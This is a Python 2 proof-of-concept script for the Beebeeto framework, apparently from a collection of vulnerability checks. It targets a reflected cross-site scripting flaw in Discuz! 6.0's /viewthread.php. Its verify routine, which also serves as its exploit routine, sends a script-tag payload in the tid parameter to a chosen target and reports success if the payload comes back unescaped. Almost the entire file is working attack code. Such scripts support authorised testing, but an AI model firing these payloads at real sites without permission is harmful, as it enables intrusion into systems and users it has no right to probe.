#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0125',
            'name': 'Discuz! 6.0 /viewthread.php 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-10-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['6.0'],
            'type': 'Cross Site Scripting',
            'tag': ['Discuz漏洞', 'XSS漏洞', '/viewthread.php', 'php'],
            'desc': 'Cross site scripting has benn found on viewthread.php file.',
            'references': ['https://www.yascanner.com/#!/x/11200',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/viewthread.php?tid="/><script>alert(233)</script>'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '"/><script>alert(233)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())